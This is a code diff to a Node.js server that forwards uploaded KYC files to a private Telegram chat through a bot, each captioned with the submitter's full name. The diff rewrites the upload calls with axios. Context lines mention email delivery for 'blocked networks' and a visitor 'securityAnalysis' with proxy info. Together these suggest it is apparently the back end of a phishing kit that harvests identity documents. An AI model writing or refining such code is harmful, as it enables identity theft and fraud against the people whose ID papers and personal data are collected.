@@ -2,6 +2,7 @@ import nodemailer from 'nodemailer';
 import fs from 'fs';
 import path from 'path';
 import FormData from 'form-data';
+import axios from 'axios';
 
 // Email configuration - Try different approach for blocked networks
 const createEmailTransporter = () => {
@@ -248,78 +249,88 @@ ${securityAnalysis.proxyInfo ? `
           const isVideo = ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm'].includes(fileExtension);
 
           if (isImage) {
-            // Send as photo using multipart/form-data
+            // Send as photo using axios (works better than fetch)
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', file.buffer, file.originalname);
             formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);
 
-            console.log('FormData headers:', formData.getHeaders());
-            console.log('FormData boundary:', formData.getBoundary());
+            try {
+              const photoResponse = await axios.post(
+                `https://api.telegram.org/bot${botToken}/sendPhoto`,
+                formData,
+                {
+                  headers: formData.getHeaders(),
+                  maxContentLength: Infinity,
+                  maxBodyLength: Infinity,
+                }
+              );
 
-            const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-              method: 'POST',
-              body: formData,
-              headers: formData.getHeaders()
-            });
-
-            if (!photoResponse.ok) {
-              const errorText = await photoResponse.text();
+              console.log('Photo sent to Telegram successfully:', photoResponse.data);
+            } catch (error) {
               console.error('Failed to send photo to Telegram:');
-              console.error('Status:', photoResponse.status);
-              console.error('Status Text:', photoResponse.statusText);
-              console.error('Error Response:', errorText);
-              console.error('Bot Token (first 10 chars):', botToken ? botToken.substring(0, 10) + '...' : 'NOT SET');
-              console.error('Chat ID:', chatId);
-            } else {
-              const responseText = await photoResponse.text();
-              console.log('Photo sent to Telegram successfully:', responseText);
+              if (error.response) {
+                console.error('Status:', error.response.status);
+                console.error('Error Response:', error.response.data);
+              } else {
+                console.error('Error:', error.message);
+              }
             }
           } else if (isVideo) {
-            // Send as video using multipart/form-data
+            // Send as video using axios
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('video', file.buffer, file.originalname);
             formData.append('caption', `🎥 ${file.originalname} - ${kycData.fullName}`);
 
-            const videoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-              method: 'POST',
-              body: formData,
-              headers: formData.getHeaders()
-            });
+            try {
+              const videoResponse = await axios.post(
+                `https://api.telegram.org/bot${botToken}/sendVideo`,
+                formData,
+                {
+                  headers: formData.getHeaders(),
+                  maxContentLength: Infinity,
+                  maxBodyLength: Infinity,
+                }
+              );
 
-            if (!videoResponse.ok) {
-              const errorText = await videoResponse.text();
+              console.log('Video sent to Telegram successfully:', videoResponse.data);
+            } catch (error) {
               console.error('Failed to send video to Telegram:');
-              console.error('Status:', videoResponse.status);
-              console.error('Status Text:', videoResponse.statusText);
-              console.error('Error Response:', errorText);
-            } else {
-              const responseText = await videoResponse.text();
-              console.log('Video sent to Telegram successfully:', responseText);
+              if (error.response) {
+                console.error('Status:', error.response.status);
+                console.error('Error Response:', error.response.data);
+              } else {
+                console.error('Error:', error.message);
+              }
             }
           } else {
-            // Send as document using multipart/form-data
+            // Send as document using axios
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('document', file.buffer, file.originalname);
             formData.append('caption', `📄 ${file.originalname} - ${kycData.fullName}`);
 
-            const docResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-              method: 'POST',
-              body: formData,
-              headers: formData.getHeaders()
-            });
+            try {
+              const docResponse = await axios.post(
+                `https://api.telegram.org/bot${botToken}/sendDocument`,
+                formData,
+                {
+                  headers: formData.getHeaders(),
+                  maxContentLength: Infinity,
+                  maxBodyLength: Infinity,
+                }
+              );
 
-            if (!docResponse.ok) {
-              const errorText = await docResponse.text();
+              console.log('Document sent to Telegram successfully:', docResponse.data);
+            } catch (error) {
               console.error('Failed to send document to Telegram:');
-              console.error('Status:', docResponse.status);
-              console.error('Status Text:', docResponse.statusText);
-              console.error('Error Response:', errorText);
-            } else {
-              const responseText = await docResponse.text();
-              console.log('Document sent to Telegram successfully:', responseText);
+              if (error.response) {
+                console.error('Status:', error.response.status);
+                console.error('Error Response:', error.response.data);
+              } else {
+                console.error('Error:', error.message);
+              }
             }
           }
         } catch (fileError) {
